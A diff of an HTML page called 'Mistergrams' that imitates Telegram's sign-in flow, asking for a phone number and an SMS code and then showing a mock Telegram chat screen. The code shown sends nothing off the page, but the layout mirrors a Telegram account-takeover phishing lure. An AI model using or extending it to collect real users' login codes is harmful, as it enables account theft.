@@ -3,24 +3,24 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width">
-    <title>Mistergrams - Sign In</title>
+    <title>Mistergrams</title>
     <style>
         body {
             background-color: #0e1621;
             color: #f5f5f5;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            justify-content: center;
             height: 100vh;
-            margin: 0;
+            overflow: hidden;
         }
         .container {
             text-align: center;
             width: 100%;
             max-width: 320px;
             padding: 20px;
+            margin: auto;
         }
         .avatar-container {
             width: 90px;
@@ -69,7 +69,6 @@
         }
         select {
             border-bottom: 1px solid #232e3c;
-            color: #f5f5f5;
         }
         select option {
             background-color: #17212b;
@@ -85,73 +84,188 @@
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
         }
-        button:active {
-            background-color: #4072a7;
+        
+        #step-main {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            width: 100%;
+            background-color: #0e1621;
         }
+        .tg-header {
+            background-color: #17212b;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        .tg-search {
+            background-color: #242f3d;
+            border-radius: 20px;
+            padding: 8px 16px;
+            color: #899ab5;
+            flex-grow: 1;
+            font-size: 15px;
+        }
+        .tg-chat-list {
+            flex-grow: 1;
+            overflow-y: auto;
+        }
+        .tg-chat-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 16px;
+            gap: 14px;
+            border-bottom: 1px solid #17212b;
+        }
+        .tg-chat-avatar {
+            width: 50px;
+            height: 50px;
+            background-color: #2b5278;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #fff;
+        }
+        .tg-chat-info {
+            flex-grow: 1;
+            text-align: left;
+        }
+        .tg-chat-title {
+            font-weight: 600;
+            font-size: 15px;
+            margin-bottom: 4px;
+        }
+        .tg-chat-message {
+            color: #899ab5;
+            font-size: 13px;
+        }
+        .tg-nav {
+            background-color: #17212b;
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0;
+            border-top: 1px solid #232e3c;
+        }
+        .tg-nav-item {
+            color: #899ab5;
+            text-align: center;
+            font-size: 11px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+        }
+        .tg-nav-item.active {
+            color: #5288c1;
+        }
+
         .hidden {
-            display: none;
+            display: none !important;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Экран 1: Ввод номера -->
-        <div id="step-phone">
-            <div class="avatar-container">
-                <div class="avatar-placeholder">📞</div>
-            </div>
-            <h2>Sign in to Telegram</h2>
-            <p>Please confirm your country code and enter your phone number.</p>
-            
-            <div class="input-group">
-                <select id="country">
-                    <option value="+7">Russia (+7)</option>
-                    <option value="+380" selected>Ukraine (+380)</option>
-                    <option value="+1">USA (+1)</option>
-                    <option value="+44">United Kingdom (+44)</option>
-                </select>
-                <input type="tel" id="phone" placeholder="Phone number">
-            </div>
 
-            <button onclick="goToCodeScreen()">Next</button>
+    <div id="step-phone" class="container">
+        <div class="avatar-container">
+            <div class="avatar-placeholder">📞</div>
+        </div>
+        <h2>Sign in to Telegram</h2>
+        <p>Please confirm your country code and enter your phone number.</p>
+        
+        <div class="input-group">
+            <select id="country">
+                <option value="+7">Russia (+7)</option>
+                <option value="+380" selected>Ukraine (+380)</option>
+                <option value="+1">USA (+1)</option>
+                <option value="+44">United Kingdom (+44)</option>
+            </select>
+            <input type="tel" id="phone" placeholder="Phone number">
         </div>
 
-        <!-- Экран 2: Ввод кода из SMS -->
-        <div id="step-code" class="hidden">
-            <div class="avatar-container">
-                <div class="avatar-placeholder">✉️</div>
-            </div>
-            <h2>Enter Code</h2>
-            <p>We have sent an SMS with the code to your phone.</p>
-            
-            <div class="input-group">
-                <input type="text" id="code" placeholder="Code from bot / SMS">
-            </div>
+        <button onclick="requestSmsCode()">Next</button>
+    </div>
 
-            <button onclick="verifyCode()">Confirm</button>
+    <div id="step-code" class="container hidden">
+        <div class="avatar-container">
+            <div class="avatar-placeholder">✉️</div>
+        </div>
+        <h2>Enter Code</h2>
+        <p id="code-subtitle">We have sent an SMS with the code to your phone.</p>
+        
+        <div class="input-group">
+            <input type="text" id="code" placeholder="Enter SMS code">
+        </div>
+
+        <button onclick="verifySmsCode()">Confirm</button>
+    </div>
+
+    <div id="step-main" class="hidden">
+        <div class="tg-header">
+            <div style="font-size: 20px; cursor: pointer;">☰</div>
+            <div class="tg-search">🔍 Поиск чатов</div>
+        </div>
+        
+        <div class="tg-chat-list">
+            <div class="tg-chat-item">
+                <div class="tg-chat-avatar" style="background-color: #2b5278;">M</div>
+                <div class="tg-chat-info">
+                    <div class="tg-chat-title">Mistergrams Bot</div>
+                    <div class="tg-chat-message" id="registered-phone-display">Account active</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="tg-nav">
+            <div class="tg-nav-item active">
+                <span>💬</span> Чаты
+            </div>
+            <div class="tg-nav-item">
+                <span>👥</span> Контакты
+            </div>
+            <div class="tg-nav-item">
+                <span>⚙️</span> Настройки
+            </div>
+            <div class="tg-nav-item">
+                <span>👤</span> Профиль
+            </div>
         </div>
     </div>
 
     <script>
-        function goToCodeScreen() {
-            var phone = document.getElementById('phone').value;
-            if(phone.trim() === '') {
+        let fullPhoneNumber = '';
+
+        function requestSmsCode() {
+            var country = document.getElementById('country').value;
+            var phoneInput = document.getElementById('phone').value.trim();
+            
+            if(phoneInput === '') {
                 alert('Please enter your phone number');
-            } else {
-                document.getElementById('step-phone').classList.add('hidden');
-                document.getElementById('step-code').classList.remove('hidden');
+                return;
             }
+
+            fullPhoneNumber = country + phoneInput;
+            document.getElementById('code-subtitle').innerText = 'Verification code sent to ' + fullPhoneNumber;
+            document.getElementById('step-phone').classList.add('hidden');
+            document.getElementById('step-code').classList.remove('hidden');
         }
 
-        function verifyCode() {
-            var code = document.getElementById('code').value;
-            if(code.trim() === '') {
+        function verifySmsCode() {
+            var code = document.getElementById('code').value.trim();
+            if(code === '') {
                 alert('Please enter the code');
-            } else {
-                alert('Success! Logging in...');
+                return;
             }
+
+            document.getElementById('registered-phone-display').innerText = 'Logged in: ' + fullPhoneNumber;
+            document.getElementById('step-code').classList.add('hidden');
+            document.getElementById('step-main').classList.remove('hidden');
         }
     </script>
 </body>
